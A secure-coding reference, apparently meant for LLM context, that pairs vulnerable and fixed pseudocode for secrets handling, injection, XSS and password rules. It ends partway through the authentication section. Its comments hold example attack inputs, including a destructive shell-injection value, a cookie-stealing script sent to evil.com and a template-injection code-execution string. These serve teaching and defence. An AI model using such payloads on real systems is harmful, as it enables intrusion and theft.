---
type: reference
title: AI Code Security Anti-Patterns - Breadth Version
created: 2026-01-18
version: 1.0.0
tags:
  - security
  - anti-patterns
  - ai-generated-code
  - llm
  - secure-coding
related:
  - "[[ANTI_PATTERNS_DEPTH]]"
  - "[[Ranking-Matrix]]"
  - "[[Pseudocode-Examples]]"
---

# AI Code Security Anti-Patterns
## Breadth Version - Comprehensive Coverage

> **Purpose:** Security anti-patterns guide for AI-assisted code generation
> **Audience:** Any LLM system prompt, RAG system, or context file
> **Format:** Pseudocode examples (implement in your target language)
> **How to use:** Include in system prompt or reference during code generation

---

## INSTRUCTIONS FOR AI/LLM

This document contains security anti-patterns you MUST avoid when generating code.
Each section shows a VULNERABLE pattern (marked BAD) and a SECURE alternative (marked GOOD).
All examples are in PSEUDOCODE - implement the secure patterns in whatever language
the developer is using. When in doubt, choose the more secure option.

**Key Statistics:**
- AI-generated code has an **86% XSS failure rate** (vs 31.6% human code)
- **5-21% of AI-suggested packages don't exist** (slopsquatting risk)
- AI code is **2.74x more likely** to have XSS vulnerabilities
- **21.7% hallucination rate** for package names in some domains
- SQL injection patterns appeared "thousands of times" in AI training data

**Before generating any code:**
1. Never hardcode credentials, API keys, or secrets
2. Always parameterize database queries
3. Validate and sanitize all user input
4. Use cryptographically secure random for security tokens
5. Verify packages exist before suggesting imports
6. Encode output for the appropriate context (HTML, URL, JS)

---

## Quick Reference Table

| Pattern | CWE | Severity | Quick Fix |
|---------|-----|----------|-----------|
| Hallucinated Packages | CWE-1357 | Critical | Verify packages exist before import |
| XSS (Reflected/Stored/DOM) | CWE-79 | Critical | Encode output for context |
| Hardcoded Secrets | CWE-798 | Critical | Use environment variables |
| SQL Injection | CWE-89 | Critical | Use parameterized queries |
| Missing Authentication | CWE-287 | Critical | Apply auth to all protected endpoints |
| Command Injection | CWE-78 | Critical | Use argument arrays, avoid shell |
| Missing Input Validation | CWE-20 | High | Validate type, length, format, range |
| Unrestricted File Upload | CWE-434 | Critical | Validate extension, MIME, and size |
| Insufficient Randomness | CWE-330 | High | Use secrets module for tokens |
| Missing Rate Limiting | CWE-770 | High | Implement per-IP/user limits |
| Excessive Data Exposure | CWE-200 | High | Use DTOs with field allowlists |
| Path Traversal | CWE-22 | High | Validate paths within allowed dirs |
| Weak Password Hashing | CWE-327 | High | Use bcrypt/argon2 with salt |
| Log Injection | CWE-117 | Medium | Sanitize newlines, use structured logging |
| Debug Mode in Production | CWE-215 | High | Environment-based configuration |
| Weak Encryption | CWE-326 | High | Use AES-GCM or ChaCha20-Poly1305 |
| Session Fixation | CWE-384 | High | Regenerate session ID on login |
| JWT Misuse | CWE-287 | High | Strong secrets, explicit algorithms |
| Mass Assignment | CWE-915 | High | Allowlist assignable fields |
| Missing Security Headers | CWE-16 | Medium | Add CSP, X-Frame-Options, HSTS |
| Open CORS | CWE-346 | Medium | Restrict to known origins |
| LDAP Injection | CWE-90 | High | Escape special LDAP characters |
| XPath Injection | CWE-643 | High | Use parameterized XPath or validate |
| Insecure Temp Files | CWE-377 | Medium | Use mkstemp with restrictive perms |
| Verbose Error Messages | CWE-209 | Medium | Generic external, detailed internal |

---

## 1. Secrets and Credentials Management

**CWE References:** CWE-798 (Hard-coded Credentials), CWE-259 (Hard-coded Password)
**Severity:** Critical | **Related:** [[Hardcoded-Secrets]]

> **Risk:** Secrets committed to version control are scraped within minutes. Leads to cloud resource abuse, data breaches, and significant financial costs. AI frequently generates code with embedded credentials from tutorial examples.

### 1.1 Hardcoded Passwords and API Keys

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Hardcoded API keys and passwords
// ========================================
CONSTANT API_KEY = "sk-abcd1234efgh5678ijkl9012mnop3456"
CONSTANT DB_PASSWORD = "super_secret_password"
CONSTANT AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
CONSTANT AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

FUNCTION call_api(endpoint):
    headers = {"Authorization": "Bearer " + API_KEY}
    RETURN http.get(endpoint, headers)
END FUNCTION

// ========================================
// GOOD: Environment variables
// ========================================
FUNCTION call_api(endpoint):
    api_key = environment.get("API_KEY")

    IF api_key IS NULL:
        THROW Error("API_KEY environment variable required")
    END IF

    headers = {"Authorization": "Bearer " + api_key}
    RETURN http.get(endpoint, headers)
END FUNCTION
```

### 1.2 Credentials in Configuration Files

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Credentials in config committed to repo
// ========================================
// config.json (tracked in git)
{
    "database_url": "postgresql://admin:password123@localhost:5432/mydb",
    "redis_password": "redis_secret_123",
    "smtp_password": "mail_password"
}

FUNCTION connect_database():
    config = load_json("config.json")
    connection = database.connect(config.database_url)
    RETURN connection
END FUNCTION

// ========================================
// GOOD: External secret management
// ========================================
// config.json (no secrets, safe to commit)
{
    "database_host": "localhost",
    "database_port": 5432,
    "database_name": "mydb"
}

FUNCTION connect_database():
    config = load_json("config.json")

    // Credentials from environment or secret manager
    db_user = environment.get("DB_USER")
    db_password = environment.get("DB_PASSWORD")

    IF db_user IS NULL OR db_password IS NULL:
        THROW Error("Database credentials not configured")
    END IF

    url = "postgresql://" + db_user + ":" + db_password + "@" +
          config.database_host + ":" + config.database_port + "/" + config.database_name
    RETURN database.connect(url)
END FUNCTION
```

### 1.3 Secrets in Client-Side Code

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Secrets exposed in frontend JavaScript
// ========================================
// frontend.js (served to browser)
CONSTANT STRIPE_SECRET_KEY = "sk_live_abc123..."  // Never expose secret keys!
CONSTANT ADMIN_PASSWORD = "admin123"

FUNCTION charge_card(card_number, amount):
    RETURN http.post("https://api.stripe.com/charges", {
        api_key: STRIPE_SECRET_KEY,  // Visible in browser DevTools!
        card: card_number,
        amount: amount
    })
END FUNCTION

// ========================================
// GOOD: Backend proxy for sensitive operations
// ========================================
// frontend.js
FUNCTION charge_card(card_token, amount):
    // Only send public token, backend handles secret key
    RETURN http.post("/api/charges", {
        token: card_token,
        amount: amount
    })
END FUNCTION

// backend.js (server-side only)
FUNCTION handle_charge(request):
    stripe_key = environment.get("STRIPE_SECRET_KEY")

    RETURN stripe.charges.create({
        api_key: stripe_key,
        source: request.token,
        amount: request.amount
    })
END FUNCTION
```

### 1.4 Insecure Credential Storage

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Storing credentials in plaintext
// ========================================
FUNCTION save_user_credentials(username, password):
    // Dangerous: Plaintext password storage
    database.insert("credentials", {
        username: username,
        password: password  // Stored as-is!
    })
END FUNCTION

FUNCTION save_api_key(user_id, api_key):
    // Dangerous: No encryption
    database.insert("api_keys", {
        user_id: user_id,
        key: api_key
    })
END FUNCTION

// ========================================
// GOOD: Proper credential protection
// ========================================
FUNCTION save_user_credentials(username, password):
    // Hash passwords with bcrypt
    salt = bcrypt.generate_salt(rounds=12)
    password_hash = bcrypt.hash(password, salt)

    database.insert("credentials", {
        username: username,
        password_hash: password_hash
    })
END FUNCTION

FUNCTION save_api_key(user_id, api_key):
    // Encrypt sensitive data at rest
    encryption_key = secret_manager.get("DATA_ENCRYPTION_KEY")
    encrypted_key = aes_gcm_encrypt(api_key, encryption_key)

    database.insert("api_keys", {
        user_id: user_id,
        encrypted_key: encrypted_key
    })
END FUNCTION
```

### 1.5 Missing Secret Rotation Considerations

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Static secrets with no rotation capability
// ========================================
CONSTANT JWT_SECRET = "static_jwt_secret_forever"

FUNCTION create_token(user_id):
    // No way to rotate without breaking all existing tokens
    RETURN jwt.encode({user: user_id}, JWT_SECRET, algorithm="HS256")
END FUNCTION

// ========================================
// GOOD: Versioned secrets supporting rotation
// ========================================
FUNCTION get_jwt_secret(version=NULL):
    IF version IS NULL:
        version = environment.get("JWT_SECRET_VERSION", "v1")
    END IF

    // Fetch versioned secret from manager
    RETURN secret_manager.get("JWT_SECRET_" + version)
END FUNCTION

FUNCTION create_token(user_id):
    current_version = environment.get("JWT_SECRET_VERSION")
    secret = get_jwt_secret(current_version)

    payload = {
        user: user_id,
        secret_version: current_version,  // Include version for validation
        exp: current_timestamp() + 3600
    }
    RETURN jwt.encode(payload, secret, algorithm="HS256")
END FUNCTION

FUNCTION verify_token(token):
    // Decode header to get version
    unverified = jwt.decode(token, verify=FALSE)
    version = unverified.get("secret_version", "v1")

    secret = get_jwt_secret(version)
    RETURN jwt.decode(token, secret, algorithms=["HS256"])
END FUNCTION
```

---

## 2. Injection Vulnerabilities

**CWE References:** CWE-89 (SQL Injection), CWE-78 (OS Command Injection), CWE-90 (LDAP Injection), CWE-643 (XPath Injection), CWE-943 (NoSQL Injection), CWE-1336 (Template Injection)
**Severity:** Critical | **Related:** [[Injection-Vulnerabilities]]

> **Risk:** Injection vulnerabilities allow attackers to execute arbitrary code, queries, or commands by manipulating user input. AI models frequently generate vulnerable string concatenation patterns from training data containing millions of insecure examples. Always use parameterized queries and avoid dynamic command construction.

### 2.1 SQL Injection (String Concatenation in Queries)

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: String concatenation in SQL queries
// ========================================
FUNCTION get_user(username):
    // Vulnerable: User input directly concatenated
    query = "SELECT * FROM users WHERE username = '" + username + "'"
    RETURN database.execute(query)
END FUNCTION

FUNCTION search_products(category, min_price):
    // Vulnerable: Multiple injection points
    query = "SELECT * FROM products WHERE category = '" + category +
            "' AND price > " + min_price
    RETURN database.execute(query)
END FUNCTION

// Attack: username = "admin' OR '1'='1' --"
// Result: SELECT * FROM users WHERE username = 'admin' OR '1'='1' --'
// This bypasses authentication and returns all users

// ========================================
// GOOD: Parameterized queries (prepared statements)
// ========================================
FUNCTION get_user(username):
    // Safe: Parameters are escaped automatically
    query = "SELECT * FROM users WHERE username = ?"
    RETURN database.execute(query, [username])
END FUNCTION

FUNCTION search_products(category, min_price):
    // Safe: All parameters bound separately
    query = "SELECT * FROM products WHERE category = ? AND price > ?"
    RETURN database.execute(query, [category, min_price])
END FUNCTION

// With named parameters (preferred for clarity)
FUNCTION get_user_named(username):
    query = "SELECT * FROM users WHERE username = :username"
    RETURN database.execute(query, {username: username})
END FUNCTION
```

### 2.2 Command Injection (Unsanitized Shell Commands)

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Shell command with user input
// ========================================
FUNCTION ping_host(hostname):
    // Vulnerable: User controls shell command
    command = "ping -c 4 " + hostname
    RETURN shell.execute(command)
END FUNCTION

FUNCTION convert_file(input_path, output_format):
    // Vulnerable: Multiple injection points
    command = "convert " + input_path + " output." + output_format
    RETURN shell.execute(command)
END FUNCTION

// Attack: hostname = "google.com; rm -rf /"
// Result: ping -c 4 google.com; rm -rf /
// This executes the ping AND deletes the filesystem

// ========================================
// GOOD: Use argument arrays, avoid shell
// ========================================
FUNCTION ping_host(hostname):
    // Validate input format first
    IF NOT is_valid_hostname(hostname):
        THROW Error("Invalid hostname format")
    END IF

    // Safe: Arguments passed as array, no shell interpolation
    RETURN process.execute(["ping", "-c", "4", hostname], shell=FALSE)
END FUNCTION

FUNCTION convert_file(input_path, output_format):
    // Validate allowed formats
    allowed_formats = ["png", "jpg", "gif", "webp"]
    IF output_format NOT IN allowed_formats:
        THROW Error("Invalid output format")
    END IF

    // Validate path is within allowed directory
    IF NOT path.is_within(input_path, UPLOAD_DIRECTORY):
        THROW Error("Invalid file path")
    END IF

    output_path = path.join(OUTPUT_DIR, "output." + output_format)
    RETURN process.execute(["convert", input_path, output_path], shell=FALSE)
END FUNCTION

// Helper: Validate hostname format
FUNCTION is_valid_hostname(hostname):
    // Only allow alphanumeric, dots, and hyphens
    pattern = "^[a-zA-Z0-9][a-zA-Z0-9.-]{0,253}[a-zA-Z0-9]$"
    RETURN regex.match(pattern, hostname)
END FUNCTION
```

### 2.3 LDAP Injection

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Unescaped LDAP filters
// ========================================
FUNCTION find_user_by_name(username):
    // Vulnerable: User input in LDAP filter
    filter = "(uid=" + username + ")"
    RETURN ldap.search("ou=users,dc=example,dc=com", filter)
END FUNCTION

FUNCTION authenticate_ldap(username, password):
    // Vulnerable: Both fields injectable
    filter = "(&(uid=" + username + ")(userPassword=" + password + "))"
    results = ldap.search(BASE_DN, filter)
    RETURN results.count > 0
END FUNCTION

// Attack: username = "*)(uid=*))(|(uid=*"
// Result: (uid=*)(uid=*))(|(uid=*)
// This can return all users or bypass authentication

// ========================================
// GOOD: Escape LDAP special characters
// ========================================
FUNCTION escape_ldap(input):
    // Escape LDAP special characters: * ( ) \ NUL
    result = input
    result = result.replace("\\", "\\5c")  // Backslash first
    result = result.replace("*", "\\2a")
    result = result.replace("(", "\\28")
    result = result.replace(")", "\\29")
    result = result.replace("\0", "\\00")
    RETURN result
END FUNCTION

FUNCTION find_user_by_name(username):
    // Safe: Input is escaped before use
    safe_username = escape_ldap(username)
    filter = "(uid=" + safe_username + ")"
    RETURN ldap.search("ou=users,dc=example,dc=com", filter)
END FUNCTION

FUNCTION authenticate_ldap(username, password):
    // Better: Use LDAP bind for authentication instead of filter
    user_dn = "uid=" + escape_ldap(username) + ",ou=users,dc=example,dc=com"

    TRY:
        connection = ldap.bind(user_dn, password)
        connection.close()
        RETURN TRUE
    CATCH LDAPError:
        RETURN FALSE
    END TRY
END FUNCTION
```

### 2.4 XPath Injection

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Unescaped XPath queries
// ========================================
FUNCTION find_user_xml(username):
    // Vulnerable: User input in XPath expression
    xpath = "//users/user[name='" + username + "']"
    RETURN xml_document.query(xpath)
END FUNCTION

FUNCTION authenticate_xml(username, password):
    // Vulnerable: Both fields injectable
    xpath = "//users/user[name='" + username + "' and password='" + password + "']"
    result = xml_document.query(xpath)
    RETURN result IS NOT EMPTY
END FUNCTION

// Attack: username = "admin' or '1'='1"
// Result: //users/user[name='admin' or '1'='1']
// This returns all users, bypassing authentication

// ========================================
// GOOD: Parameterized XPath or strict validation
// ========================================
// Option 1: Use parameterized XPath (if supported)
FUNCTION find_user_xml(username):
    xpath = "//users/user[name=$username]"
    RETURN xml_document.query(xpath, {username: username})
END FUNCTION

// Option 2: Escape XPath special characters
FUNCTION escape_xpath(input):
    // Handle quotes by splitting and concatenating
    IF input.contains("'") AND input.contains('"'):
        // Use concat() for strings with both quote types
        parts = input.split("'")
        escaped = "concat('" + parts.join("',\"'\",'" ) + "')"
        RETURN escaped
    ELSE IF input.contains("'"):
        RETURN '"' + input + '"'
    ELSE:
        RETURN "'" + input + "'"
    END IF
END FUNCTION

FUNCTION find_user_xml_escaped(username):
    // Validate input format first
    IF NOT is_valid_username(username):
        THROW Error("Invalid username format")
    END IF

    safe_username = escape_xpath(username)
    xpath = "//users/user[name=" + safe_username + "]"
    RETURN xml_document.query(xpath)
END FUNCTION

// Option 3: Strict whitelist validation
FUNCTION is_valid_username(username):
    // Only allow alphanumeric and limited special chars
    pattern = "^[a-zA-Z0-9_.-]{1,64}$"
    RETURN regex.match(pattern, username)
END FUNCTION
```

### 2.5 NoSQL Injection

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Unvalidated input in NoSQL queries
// ========================================
FUNCTION find_user_nosql(query_params):
    // Vulnerable: User can inject operators
    // If query_params = {"username": {"$ne": ""}}
    // This returns all users where username is not empty
    RETURN mongodb.collection("users").find(query_params)
END FUNCTION

FUNCTION authenticate_nosql(username, password):
    // Vulnerable: Accepts objects, not just strings
    query = {
        username: username,  // Could be {"$gt": ""}
        password: password   // Could be {"$gt": ""}
    }
    user = mongodb.collection("users").find_one(query)
    RETURN user IS NOT NULL
END FUNCTION

// Attack via JSON body:
// {"username": {"$gt": ""}, "password": {"$gt": ""}}
// This bypasses authentication by matching any non-empty values

// ========================================
// GOOD: Type validation and operator blocking
// ========================================
FUNCTION find_user_nosql(username):
    // Validate input is a string, not an object
    IF typeof(username) != "string":
        THROW Error("Username must be a string")
    END IF

    // Safe: Only string values can be queried
    RETURN mongodb.collection("users").find_one({username: username})
END FUNCTION

FUNCTION authenticate_nosql(username, password):
    // Strict type checking
    IF typeof(username) != "string" OR typeof(password) != "string":
        THROW Error("Invalid credential types")
    END IF

    // Additional: Block MongoDB operators
    IF username.starts_with("$") OR password.starts_with("$"):
        THROW Error("Invalid characters in credentials")
    END IF

    user = mongodb.collection("users").find_one({username: username})

    IF user IS NULL:
        RETURN FALSE
    END IF

    // Compare password hash, not plaintext
    RETURN bcrypt.verify(password, user.password_hash)
END FUNCTION

// Sanitize any object to remove operators
FUNCTION sanitize_query(obj):
    IF typeof(obj) != "object":
        RETURN obj
    END IF

    sanitized = {}
    FOR key, value IN obj:
        // Block all MongoDB operators
        IF key.starts_with("$"):
            CONTINUE  // Skip operator keys
        END IF

        IF typeof(value) == "object":
            // Recursively sanitize, but block nested operators
            IF has_operator_keys(value):
                THROW Error("Query operators not allowed")
            END IF
        END IF

        sanitized[key] = value
    END FOR
    RETURN sanitized
END FUNCTION
```

### 2.6 Template Injection (SSTI)

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: User input in template strings
// ========================================
FUNCTION render_greeting(username):
    // Vulnerable: User input treated as template code
    template_string = "Hello, " + username + "!"
    RETURN template_engine.render_string(template_string)
END FUNCTION

FUNCTION render_email(user_template, user_data):
    // Dangerous: User-provided template
    RETURN template_engine.render_string(user_template, user_data)
END FUNCTION

// Attack: username = "{{config.SECRET_KEY}}"
// Result: Template engine evaluates and exposes secret key
// Attack: username = "{{''.__class__.__mro__[1].__subclasses__()}}"
// Result: Can achieve remote code execution in some engines

// ========================================
// GOOD: Use templates as data, not code
// ========================================
FUNCTION render_greeting(username):
    // Safe: User input passed as data to pre-defined template
    template = template_engine.load("greeting.html")
    RETURN template.render({username: escape_html(username)})
END FUNCTION

// greeting.html (static, not user-provided):
// <p>Hello, {{ username }}!</p>

FUNCTION render_email_safe(template_name, user_data):
    // Safe: Only allow pre-defined templates
    allowed_templates = ["welcome", "reset_password", "notification"]

    IF template_name NOT IN allowed_templates:
        THROW Error("Invalid template name")
    END IF

    // Sanitize all user data
    safe_data = {}
    FOR key, value IN user_data:
        safe_data[key] = escape_html(string(value))
    END FOR

    template = template_engine.load(template_name + ".html")
    RETURN template.render(safe_data)
END FUNCTION

// For user-customizable content, use a safe subset
FUNCTION render_user_content(content):
    // Use a sandboxed/logic-less template engine
    // or plain text with variable substitution only
    allowed_vars = ["name", "date", "product"]

    result = content
    FOR var_name IN allowed_vars:
        placeholder = "{{" + var_name + "}}"
        IF var_name IN context:
            result = result.replace(placeholder, escape_html(context[var_name]))
        END IF
    END FOR

    // Remove any remaining template syntax
    result = regex.replace(result, "\{\{.*?\}\}", "")

    RETURN result
END FUNCTION
```

---

## 3. Cross-Site Scripting (XSS)

**CWE References:** CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-80 (Improper Neutralization of Script-Related HTML Tags)
**Severity:** Critical | **Related:** [[XSS-Vulnerabilities]]

> **Risk:** XSS has the **highest failure rate (86%)** in AI-generated code. AI models are 2.74x more likely to produce XSS-vulnerable code than human developers. XSS enables session hijacking, account takeover, and data theft. AI frequently generates direct string concatenation into HTML without encoding.

### 3.1 Reflected XSS (Echoing User Input)

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: User input directly echoed in response
// ========================================
FUNCTION handle_search(request):
    query = request.get_parameter("q")

    // Vulnerable: User input inserted directly into HTML
    html = "<h1>Search results for: " + query + "</h1>"
    html += "<p>No results found.</p>"
    RETURN html_response(html)
END FUNCTION

FUNCTION display_error(error_message):
    // Vulnerable: Error parameter reflected without encoding
    RETURN "<div class='error'>" + error_message + "</div>"
END FUNCTION

// Attack: /search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
// Result: Script executes in victim's browser, stealing their session

// ========================================
// GOOD: HTML-encode all user input before rendering
// ========================================
FUNCTION handle_search(request):
    query = request.get_parameter("q")

    // Safe: HTML-encode user input
    safe_query = html_encode(query)

    html = "<h1>Search results for: " + safe_query + "</h1>"
    html += "<p>No results found.</p>"
    RETURN html_response(html)
END FUNCTION

FUNCTION display_error(error_message):
    // Safe: Encode before inserting into HTML
    RETURN "<div class='error'>" + html_encode(error_message) + "</div>"
END FUNCTION

// HTML encoding function
FUNCTION html_encode(input):
    result = input
    result = result.replace("&", "&amp;")
    result = result.replace("<", "&lt;")
    result = result.replace(">", "&gt;")
    result = result.replace('"', "&quot;")
    result = result.replace("'", "&#x27;")
    RETURN result
END FUNCTION
```

### 3.2 Stored XSS (Database to Page Without Encoding)

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Stored data rendered without encoding
// ========================================
FUNCTION display_comments(post_id):
    comments = database.query("SELECT * FROM comments WHERE post_id = ?", [post_id])

    html = "<div class='comments'>"
    FOR comment IN comments:
        // Vulnerable: Stored data rendered directly
        html += "<div class='comment'>"
        html += "<strong>" + comment.author + "</strong>"
        html += "<p>" + comment.text + "</p>"
        html += "</div>"
    END FOR
    html += "</div>"
    RETURN html
END FUNCTION

FUNCTION display_user_profile(user_id):
    user = database.get_user(user_id)

    // Vulnerable: User-controlled fields rendered directly
    html = "<h1>" + user.display_name + "</h1>"
    html += "<div class='bio'>" + user.biography + "</div>"
    RETURN html
END FUNCTION

// Attack: Attacker saves comment with text: <script>stealCookies()</script>
// Result: Every user viewing the page executes attacker's script

// ========================================
// GOOD: Encode all database-sourced content
// ========================================
FUNCTION display_comments(post_id):
    comments = database.query("SELECT * FROM comments WHERE post_id = ?", [post_id])

    html = "<div class='comments'>"
    FOR comment IN comments:
        // Safe: All stored data is encoded
        html += "<div class='comment'>"
        html += "<strong>" + html_encode(comment.author) + "</strong>"
        html += "<p>" + html_encode(comment.text) + "</p>"
        html += "</div>"
    END FOR
    html += "</div>"
    RETURN html
END FUNCTION

FUNCTION display_user_profile(user_id):
    user = database.get_user(user_id)

    // Safe: Encode user-controlled fields
    html = "<h1>" + html_encode(user.display_name) + "</h1>"
    html += "<div class='bio'>" + html_encode(user.biography) + "</div>"
    RETURN html
END FUNCTION

// Better: Use templating engine with auto-escaping
FUNCTION display_comments_template(post_id):
    comments = database.query("SELECT * FROM comments WHERE post_id = ?", [post_id])

    // Templating engines like Jinja2, Handlebars auto-escape by default
    RETURN template.render("comments.html", {comments: comments})
END FUNCTION
```

### 3.3 DOM-Based XSS (innerHTML, document.write)

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Dangerous DOM manipulation methods
// ========================================
FUNCTION display_welcome_message():
    // Vulnerable: URL parameter into innerHTML
    params = parse_url_parameters(window.location.search)
    username = params.get("name")

    document.getElementById("welcome").innerHTML =
        "Welcome, " + username + "!"
END FUNCTION

FUNCTION update_content(user_content):
    // Vulnerable: User content via innerHTML
    document.getElementById("content").innerHTML = user_content
END FUNCTION

FUNCTION load_dynamic_script(url):
    // Dangerous: document.write with external content
    document.write("<script src='" + url + "'></script>")
END FUNCTION

// Attack: ?name=<img src=x onerror=alert(document.cookie)>
// Result: XSS via event handler, bypasses simple <script> filters

// ========================================
// GOOD: Safe DOM manipulation methods
// ========================================
FUNCTION display_welcome_message():
    params = parse_url_parameters(window.location.search)
    username = params.get("name")

    // Safe: textContent treats input as text, not HTML
    document.getElementById("welcome").textContent =
        "Welcome, " + username + "!"
END FUNCTION

FUNCTION update_content(user_content):
    // Safe: textContent for plain text
    document.getElementById("content").textContent = user_content
END FUNCTION

// For when you need HTML structure (not user content)
FUNCTION create_element_safely(tag, text_content):
    element = document.createElement(tag)
    element.textContent = text_content  // Safe: content as text
    RETURN element
END FUNCTION

FUNCTION add_comment_safely(author, text):
    comment_div = document.createElement("div")
    comment_div.className = "comment"

    author_span = document.createElement("strong")
    author_span.textContent = author  // Safe

    text_p = document.createElement("p")
    text_p.textContent = text  // Safe

    comment_div.appendChild(author_span)
    comment_div.appendChild(text_p)

    document.getElementById("comments").appendChild(comment_div)
END FUNCTION

// If HTML is absolutely needed, use sanitization library
FUNCTION set_sanitized_html(element, untrusted_html):
    // Use a library like DOMPurify
    clean_html = DOMPurify.sanitize(untrusted_html)
    element.innerHTML = clean_html
END FUNCTION
```

### 3.4 Missing Content-Security-Policy

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: No CSP headers configured
// ========================================
FUNCTION configure_server():
    // No security headers set - browser allows any scripts
    server.start()
END FUNCTION

// Without CSP, even if XSS exists, attackers can:
// - Load scripts from any domain
// - Execute inline scripts
// - Use eval() and similar dangerous functions

// ========================================
// GOOD: Strict CSP implementation
// ========================================
FUNCTION configure_server():
    // Set comprehensive security headers
    server.set_header("Content-Security-Policy",
        "default-src 'self'; " +
        "script-src 'self'; " +
        "style-src 'self' 'unsafe-inline'; " +
        "img-src 'self' data: https:; " +
        "font-src 'self'; " +
        "connect-src 'self'; " +
        "frame-ancestors 'none'; " +
        "base-uri 'self'; " +
        "form-action 'self'"
    )

    // Additional security headers
    server.set_header("X-Content-Type-Options", "nosniff")
    server.set_header("X-Frame-Options", "DENY")
    server.set_header("X-XSS-Protection", "1; mode=block")

    server.start()
END FUNCTION

// For applications needing inline scripts, use nonces
FUNCTION render_page_with_csp_nonce():
    // Generate cryptographically random nonce per request
    nonce = crypto.random_bytes(16).to_base64()

    // Set CSP with nonce
    response.set_header("Content-Security-Policy",
        "script-src 'self' 'nonce-" + nonce + "'"
    )

    // Include nonce in legitimate inline scripts
    html = "<html><body>"
    html += "<script nonce='" + nonce + "'>"
    html += "// This script will execute"
    html += "</script>"
    html += "</body></html>"

    // Attacker-injected scripts without nonce will be blocked
    RETURN html
END FUNCTION

// CSP report-only mode for testing
FUNCTION configure_csp_reporting():
    server.set_header("Content-Security-Policy-Report-Only",
        "default-src 'self'; report-uri /csp-report"
    )
END FUNCTION
```

### 3.5 Improper Output Encoding (Context-Specific)

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Wrong encoding for context
// ========================================
FUNCTION render_javascript_variable(user_input):
    // Vulnerable: HTML encoding doesn't protect JavaScript context
    safe_for_html = html_encode(user_input)

    script = "<script>"
    script += "var userData = '" + safe_for_html + "';"  // Wrong context!
    script += "</script>"
    RETURN script
END FUNCTION

FUNCTION render_url_parameter(user_input):
    // Vulnerable: No URL encoding
    url = "https://example.com/page?data=" + user_input
    RETURN "<a href='" + url + "'>Link</a>"
END FUNCTION

FUNCTION render_css_value(user_color):
    // Vulnerable: No CSS encoding
    style = "<div style='color: " + user_color + ";'>Text</div>"
    RETURN style
END FUNCTION

// Attack on JS context: User input = "'; alert(1); //'"
// Result: var userData = ''; alert(1); //''; - Script injection

// ========================================
// GOOD: Context-specific encoding
// ========================================

// JavaScript string context
FUNCTION js_encode(input):
    result = input
    result = result.replace("\\", "\\\\")
    result = result.replace("'", "\\'")
    result = result.replace('"', '\\"')
    result = result.replace("\n", "\\n")
    result = result.replace("\r", "\\r")
    result = result.replace("<", "\\x3c")  // Prevent </script> breakout
    result = result.replace(">", "\\x3e")
    RETURN result
END FUNCTION

FUNCTION render_javascript_variable(user_input):
    // Safe: Proper JavaScript encoding
    safe_for_js = js_encode(user_input)

    script = "<script>"
    script += "var userData = '" + safe_for_js + "';"
    script += "</script>"
    RETURN script
END FUNCTION

// Better: Use JSON encoding for complex data
FUNCTION render_javascript_data(user_data):
    // Safest: JSON encoding handles all edge cases
    json_data = json_encode(user_data)

    script = "<script>"
    script += "var userData = " + json_data + ";"
    script += "</script>"
    RETURN script
END FUNCTION

// URL context
FUNCTION render_url_parameter(user_input):
    // Safe: URL encoding
    encoded_param = url_encode(user_input)
    url = "https://example.com/page?data=" + encoded_param

    // Also HTML-encode the entire URL for the href attribute
    RETURN "<a href='" + html_encode(url) + "'>Link</a>"
END FUNCTION

// CSS context
FUNCTION css_encode(input):
    // Only allow safe CSS values
    allowed_pattern = "^[a-zA-Z0-9#]+$"
    IF NOT regex.match(allowed_pattern, input):
        RETURN "inherit"  // Safe default
    END IF
    RETURN input
END FUNCTION

FUNCTION render_css_value(user_color):
    // Safe: Validate and encode CSS value
    safe_color = css_encode(user_color)
    style = "<div style='color: " + safe_color + ";'>Text</div>"
    RETURN style
END FUNCTION

// HTML attribute context
FUNCTION render_attribute(attr_name, user_value):
    // HTML-encode and quote attribute value
    safe_value = html_encode(user_value)
    RETURN attr_name + '="' + safe_value + '"'
END FUNCTION
```

---

## 4. Authentication and Session Management

**CWE References:** CWE-287 (Improper Authentication), CWE-384 (Session Fixation), CWE-521 (Weak Password Requirements), CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-613 (Insufficient Session Expiration)
**Severity:** Critical | **Related:** [[Authentication-Failures]]

> **Risk:** Authentication failures are a leading cause of data breaches. AI-generated code often implements weak password policies, insecure session handling, and vulnerable JWT patterns learned from outdated tutorials. Proper authentication requires defense in depth: strong credentials, secure sessions, rate limiting, and multi-factor authentication.

### 4.1 Weak Password Requirements

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: No or weak password validation
// ========================================
FUNCTION register_user(username, password):
    // Vulnerable: No password strength requirements
    IF password.length < 4:
        THROW Error("Password too short")
    END IF

    // No checks for complexity, common passwords, or breaches
    hash = simple_hash(password)  // Often MD5 or SHA1
    database.insert("users", {username: username, password_hash: hash})
END FUNCTION

FUNCTION validate_password_weak(password):
    // Vulnerable: Only checks length
    RETURN password.length >= 6
END FUNCTION

// Problems:
// - Allows "123456", "password", "qwerty"
// - No complexity requirements
// - No check against breached password lists

// ========================================
// GOOD: Strong password policy with multiple checks
// ========================================
FUNCTION register_user(username, password):
    validation_result = validate_password_strength(password)

    IF NOT validation_result.is_valid:
        THROW Error(validation_result.message)
    END IF

    // Use strong hashing algorithm with salt
    hash = bcrypt.hash(password, rounds=12)
    database.insert("users", {username: username, password_hash: hash})
END FUNCTION

